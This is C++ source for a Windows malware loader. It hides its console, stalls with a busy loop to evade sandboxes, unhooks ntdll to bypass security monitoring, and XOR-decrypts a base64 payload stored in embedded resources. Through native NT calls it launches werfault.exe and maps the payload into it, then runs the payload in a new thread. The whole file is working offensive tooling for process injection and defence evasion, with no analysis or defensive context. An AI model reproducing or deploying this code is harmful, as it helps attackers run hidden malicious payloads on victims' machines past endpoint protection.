#include <iostream>
#include <Windows.h>
#include <string>
#include "ntdll.h"
#include "base64.h"
#include "resource.h"

#define LARGE_NUMBER 333333
#define INJECTED_PROCESS_NAME L"\\??\\C:\\Windows\\System32\\werfault.exe"

void sleep();
const std::string loadPayload();

int main(int argc, char** argv)
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	sleep();

	HMODULE ntdll = LoadLibrary(TEXT("ntdll.dll"));
	if (ntdll == NULL)
	{
		exit(1);
	}
	unhookNtdll(ntdll);
	loadNtdll(ntdll);

	const std::string payload = loadPayload();
	SIZE_T size = payload.size();
	LARGE_INTEGER sectionSize = { size };
	HANDLE currentProcess = GetCurrentProcess();
	HANDLE section = NULL;
	PVOID localSection = NULL, targetSection = NULL;
	PRTL_USER_PROCESS_INFORMATION targetProcessInformation = NULL;
	PRTL_USER_PROCESS_PARAMETERS targetProcessParameters = NULL;
	UNICODE_STRING imagePathName = {};
	HANDLE targetProcessThread = NULL;
	NTSTATUS status = NULL;

	status = NtCreateSection(&section, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	checkNtStatus(status);

	status = NtMapViewOfSection(section, currentProcess, &localSection, NULL, NULL, NULL, (PULONG)&size, ViewUnmap, NULL, PAGE_READWRITE);
	checkNtStatus(status);

	RtlInitUnicodeString(&imagePathName, INJECTED_PROCESS_NAME);

	status = RtlCreateProcessParameters(&targetProcessParameters, &imagePathName, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	checkNtStatus(status);

	targetProcessInformation = (PRTL_USER_PROCESS_INFORMATION)malloc(sizeof(PRTL_USER_PROCESS_INFORMATION));
	status = RtlCreateUserProcess(&imagePathName, NULL, targetProcessParameters, NULL, NULL, currentProcess, FALSE, NULL, NULL, targetProcessInformation);
	checkNtStatus(status);

	status = NtMapViewOfSection(section, targetProcessInformation->ProcessHandle, &targetSection, NULL, NULL, NULL, (PULONG)&size, ViewUnmap, NULL, PAGE_EXECUTE_READ);
	checkNtStatus(status);

	status = NtWriteVirtualMemory(currentProcess, localSection, (PVOID)payload.c_str(), size, NULL);
	checkNtStatus(status);

	status = RtlCreateUserThread(targetProcessInformation->ProcessHandle, NULL, FALSE, 0, 0, 0, targetSection, NULL, &targetProcessThread, NULL);
	checkNtStatus(status);

	status = NtWaitForSingleObject(targetProcessThread, FALSE, NULL);
	checkNtStatus(status);

	status = NtClose(targetProcessThread);
	checkNtStatus(status);
	status = NtUnmapViewOfSection(targetProcessInformation->ProcessHandle, targetSection);
	checkNtStatus(status);
	status = NtClose(targetProcessInformation->ProcessHandle);
	checkNtStatus(status);
	free(targetProcessInformation);

	status = NtUnmapViewOfSection(currentProcess, localSection);
	checkNtStatus(status);
	status = NtClose(section);
	checkNtStatus(status);

	FreeLibrary(ntdll);

	return 0;
}

void sleep()
{
	for (int i = 0; i <= LARGE_NUMBER; i++)
	{
		for (int j = 2; j <= i / 2; j++)
		{
			if (i % j == 0)
			{
				break;
			}
		}
	}
}

const std::string loadPayload()
{
	HRSRC keyResource = FindResource(NULL, MAKEINTRESOURCE(IDR_KEY1), L"key");
	DWORD keySize = SizeofResource(NULL, keyResource);
	HGLOBAL keyResourceHandle = LoadResource(NULL, keyResource);
	char* key = (char*)LockResource(keyResourceHandle);

	HRSRC obfuscatedPayloadResource = FindResource(NULL, MAKEINTRESOURCE(IDR_OBFUSCATEDPAYLOAD1), L"obfuscatedPayload");
	HGLOBAL obfuscatedPayloadResourceHandle = LoadResource(NULL, obfuscatedPayloadResource);
	char* obfuscatedPayload = (char*)LockResource(obfuscatedPayloadResourceHandle);
	const std::string encryptedPayload = base64_decode(obfuscatedPayload);
	size_t encryptedPayloadSize = encryptedPayload.size();
	std::string payload = "";

	int keyIndex = 0;
	for (int i = 0; i < encryptedPayloadSize; i += 4)
	{
		std::string currentByte = std::string() + encryptedPayload[i] + encryptedPayload[i + 1] + encryptedPayload[i + 2] + encryptedPayload[i + 3];
		payload += stol(currentByte, nullptr, 0) ^ key[keyIndex++ % keySize];
	}

	FreeResource(keyResourceHandle);
	FreeResource(obfuscatedPayloadResource);

	return payload;
}
